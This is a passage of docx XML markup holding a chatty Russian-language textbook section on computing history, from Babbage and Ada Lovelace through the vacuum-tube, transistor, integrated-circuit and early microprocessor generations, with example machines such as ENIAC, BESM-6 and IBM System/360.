        <w:t>Чарльз Бэббидж — гений или сумасшедший?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Чарльз Бэббидж</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (1791-1871) — английский математик, который в 1830-х годах сказал: «А давайте сделаем машину, которая будет считать сама, по программе!» И придумал </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналитическую машину</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Что было революционным:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Память** (store) — место для хранения чисел (1000 чисел по 50 знаков каждое)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Процессор** (mill) — устройство для арифметических операций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Устройство ввода** — перфокарты (да-да, как на ткацких станках)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Устройство вывода** — печать результатов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Условные переходы** — машина могла менять ход вычислений в зависимости от результата (if/else в железе!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Звучит знакомо?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Это же компоненты современного компьютера из главы 2.1! Процессор, память, ввод-вывод, управление.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Ада Лавлейс — первый программист в истории</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ада Лавлейс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (1815-1852) — дочь поэта Байрона, математик и первый программист. Она написала </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>программу для вычисления чисел Бернулли</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для машины Бэббиджа. Причём написала </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>до того, как машина была построена</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Она также предсказала, что такие машины смогут не только считать, но и создавать музыку, искусство, играть в игры. Провидица.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Почему машину не построили?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Деньги кончились</w:t>
      </w:r>
      <w:r>
        <w:t>. Британское правительство выделило кучу денег, Бэббидж тратил их на разработку, но технологии XIX века не позволяли изготовить такие точные механические детали. В итоге машину так и не построили при его жизни.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но идея осталась</w:t>
      </w:r>
      <w:r>
        <w:t>. И через 100 лет её воплотили в жизнь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Поколения ЭВМ: эволюция от ламп до квантов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компьютеры принято делить на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пять поколений</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> по элементной базе (из чего сделаны) и архитектуре.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Первое поколение (1940-е – 1950-е): Электронные лампы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Элементная база</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Электронные (вакуумные) лампы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стеклянные колбы с электродами, в которых электроны летают в вакууме. Принцип как в старых телевизорах. Лампы могли </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>включать и выключать ток</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — идеально для реализации двоичной логики (0 или 1).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер лампы: с кулак</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Срок службы: несколько тысяч часов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Потребление: десятки ватт на лампу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость переключения: десятки микросекунд</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры компьютеров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>ENIAC (1946, США)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ENIAC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Electronic Numerical Integrator and Computer) — первый полностью электронный компьютер общего назначения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Масса: **30 тонн** (как 6 слонов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер: занимал **комнату 9×15 метров**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Электронных ламп: **18 000 штук** (каждая греется как лампочка)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Потребление: **150 киловатт** (как 50 квартир)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость: **5000 операций сложения в секунду** (твой смартфон делает миллиарды)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программирование: **перестановка проводов и переключателей** (да, руками!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Лампы постоянно перегорали. В среднем каждые 7 минут приходилось менять лампу. Инженеры ходили с тележками запасных ламп.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интересный факт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Однажды компьютер сломался, и причиной оказался мотылёк, застрявший в реле. С тех пор ошибки в программах называют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"багами"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (bug — жук, насекомое).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>UNIVAC (1951, США)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UNIVAC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — первый коммерческий компьютер. Продавался по цене </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>$1 млн</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (в ценах 1951 года — это как $11 млн сейчас).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение</w:t>
      </w:r>
      <w:r>
        <w:t>: Перепись населения США, расчёты для военных, прогноз результатов президентских выборов (и угадал!).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Особенности первого поколения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Впервые вычисления делали автоматически, без участия человека</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Огромные размеры и вес</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Гигантское энергопотребление</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Постоянные поломки (лампы горели как спички)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программирование через перестановку проводов (представь, что для запуска программы нужно переделать схему)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленные (по современным меркам)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Память</w:t>
      </w:r>
      <w:r>
        <w:t>: магнитные барабаны, позже магнитные ленты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Быстродействие</w:t>
      </w:r>
      <w:r>
        <w:t>: тысячи операций в секунду.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программирование</w:t>
      </w:r>
      <w:r>
        <w:t>: машинный код, позже ассемблер.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Второе поколение (1950-е – 1960-е): Транзисторы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Элементная база</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Транзисторы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — полупроводниковые приборы, которые могут усиливать сигнал и работать как переключатели. Изобретены в 1947 году в Bell Labs (за это дали Нобелевскую премию в 1956 году).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества перед лампами</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер: **в 100 раз меньше** лампы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Энергопотребление: **в 100 раз меньше**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Надёжность: **в 1000 раз выше** (не перегорают)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость переключения: **в 10 раз быстрее**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры компьютеров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>IBM 7090 (1959, США)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Транзисторов: ~50 000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость: ~200 000 операций в секунду</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Память: 32 КБ (да, **килобайт**, не мегабайт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цена: $3 млн</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение</w:t>
      </w:r>
      <w:r>
        <w:t>: Научные расчёты NASA (программа Mercury — первые американцы в космосе), расчёты ядерного оружия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>БЭСМ-6 (1966, СССР)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>БЭСМ-6</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — самый мощный компьютер в Европе в своё время.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость: **1 млн операций в секунду** (1 MIPS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Память: до 192 КБ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовался в космической программе СССР, военных расчётах, науке</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интересный факт</w:t>
      </w:r>
      <w:r>
        <w:t>: На БЭСМ-6 создали первые компьютерные игры в СССР (например, шахматную программу "Каисса", победившую на чемпионате мира по компьютерным шахматам 1974 года).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Особенности второго поколения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размеры уменьшились до **шкафа** (а не комнаты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Надёжность выросла на порядки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Появились первые **языки программирования** высокого уровня: FORTRAN (1957), COBOL (1959), ALGOL (1960)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Появились **операционные системы** (простейшие, но всё же)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Всё ещё очень дорогие (миллионы долларов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Всё ещё огромные (несколько шкафов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Доступны только крупным организациям (военным, университетам, госучреждениям)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Память</w:t>
      </w:r>
      <w:r>
        <w:t>: магнитные ленты, магнитные сердечники (ферритовые кольца).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Быстродействие</w:t>
      </w:r>
      <w:r>
        <w:t>: сотни тысяч – миллионы операций в секунду.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Третье поколение (1960-е – 1970-е): Интегральные схемы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Элементная база</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интегральные схемы (ИС, чипы)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — на одной пластине кремния размещаются сотни, потом тысячи транзисторов. Первая ИС создана в 1958 году (Джек Килби, Texas Instruments — Нобелевская премия 2000 года).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы ИС</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SSI** (Small Scale Integration): 10-100 транзисторов на чип</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MSI** (Medium Scale Integration): 100-1000 транзисторов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**LSI** (Large Scale Integration): 1000-100 000 транзисторов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры компьютеров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>IBM System/360 (1964, США)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Революция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Первая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>семья компьютеров</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модели разной мощности, но с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одинаковой архитектурой</w:t>
      </w:r>
      <w:r>
        <w:t>. Программа, написанная для младшей модели, работала на старшей (только быстрее). До этого каждая модель была уникальной.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разные модели: от настольных до комнатных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Память: от 8 КБ до 8 МБ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость: от 34 000 до 1.7 млн операций в секунду</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Успех</w:t>
      </w:r>
      <w:r>
        <w:t>: IBM заработала миллиарды, System/360 стала стандартом на десятилетия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>ЕС ЭВМ (1970-е, СССР и СЭВ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ЕС ЭВМ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Единая Система ЭВМ) — советский аналог IBM System/360. Да, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>скопировали</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> архитектуру (что было политическим решением, а не воровством — дискуссии до сих пор).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение</w:t>
      </w:r>
      <w:r>
        <w:t>: Научные институты, военные, управление производством, вузы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Особенности третьего поколения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размеры уменьшились до **стола** или **нескольких шкафов**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Энергопотребление упало в десятки раз</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Появились **мультипрограммные ОС** (несколько программ одновременно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стандартизация архитектур</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Появились **мини-компьютеры** (размером с холодильник, стоили "всего" $100 000)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Всё ещё дорогие для массового использования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Всё ещё требуют специальных помещений (кондиционер, стабильное питание)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Память</w:t>
      </w:r>
      <w:r>
        <w:t>: полупроводниковая память начала вытеснять магнитные сердечники.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Быстродействие</w:t>
      </w:r>
      <w:r>
        <w:t>: миллионы операций в секунду.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Четвёртое поколение (1970-е – настоящее время): Микропроцессоры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Элементная база</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Микропроцессоры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>весь процессор на одной микросхеме</w:t>
      </w:r>
      <w:r>
        <w:t>. Это революция. Вместо шкафов с платами — один чип размером с ноготь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>СБИС</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Сверхбольшие интегральные схемы, VLSI — Very Large Scale Integration): от 100 000 до миллиардов транзисторов на чип.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Рождение микропроцессора</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Intel 4004 (1971) — первый микропроцессор</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
